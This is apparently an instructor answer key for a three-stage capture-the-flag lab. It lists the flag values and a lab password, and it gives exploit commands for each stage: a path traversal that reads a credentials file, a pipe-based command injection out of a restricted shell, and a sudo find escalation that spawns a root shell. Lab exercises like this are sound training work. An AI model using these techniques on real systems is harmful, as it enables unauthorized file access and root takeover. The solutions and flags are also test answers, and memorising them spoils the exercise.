# Instructor Guide - CyberXperience 2026

This document contains solutions, flag values, and credentials. **Do not share with participants.**

## Flag Values

All flags are configured in `flags.json` and injected via environment variables at container startup.

| Stage | Flag Value | Location |
|-------|------------|----------|
| Stage 1 | `FLAG{p4th_tr4v3rs4l_0pen_d00r}` | `/data/secrets/credentials.txt` |
| Stage 2 | `FLAG{c0mm4nd_1nj3ct10n_p1p3_dr34m}` | `/home/ctf_user/flag2.txt` |
| Stage 3 | `FLAG{gtf0_f1nd_r00t_4ccess_2026}` | `/root/root_flag.txt` |

## Credentials

```
Username: ctf_user
Password: r3str1ct3d_2026
```

These credentials are discovered by completing Stage 1.

---

## Solutions

### Stage 1: Information Disclosure (Path Traversal)

**Target:** Web Traversal API (`/api/files/<filename>`)

**Vulnerability:** The file path is not sanitized, allowing `../` sequences.

**Goal:** Read `/data/secrets/credentials.txt`

**Solution:**
```
cat ../../../data/secrets/credentials.txt
```

Or via direct API call:
```
GET /api/web/files/read?name=../../../data/secrets/credentials.txt
```

---

### Stage 2: Command Injection (Shell Escape)

**Target:** Restricted Shell

**Vulnerability:** The shell checks only the first command word but uses `shell=True`, allowing pipe operators.

**Goal:** Read `/home/ctf_user/flag2.txt`

**Solution:**
```bash
help | cat /home/ctf_user/flag2.txt
```

---

### Stage 3: Privilege Escalation (GTFOBins)

**Target:** Root access via misconfigured sudo

**Vulnerability:** `ctf_user` can run `/usr/bin/find` as root without a password.

**Goal:** Read `/root/root_flag.txt`

**Solution:**
```bash
# First, discover the sudo permissions
help | sudo -l

# Use find's -exec to read the flag
help | sudo find /root -name root_flag.txt -exec cat {} \;

# Or spawn a root shell
help | sudo find . -exec /bin/sh \; -quit
```

---

## Changing Flags

To customize flag values:

1. Edit `flags.json` in the project root
2. Update environment variables in `docker-compose.yml`:
   - `FLAG_STAGE1` for web-traversal service
   - `FLAG_STAGE2` and `FLAG_STAGE3` for shell-backend service
3. Rebuild containers: `docker-compose up --build`

---

## Security Notes

- Flag values are NOT exposed in the client-side JavaScript bundle
- Flag validation happens server-side via `/api/validate-flag` endpoint
- The gateway loads flags from `flags.json` at startup
- Services inject flags via environment variables at container startup
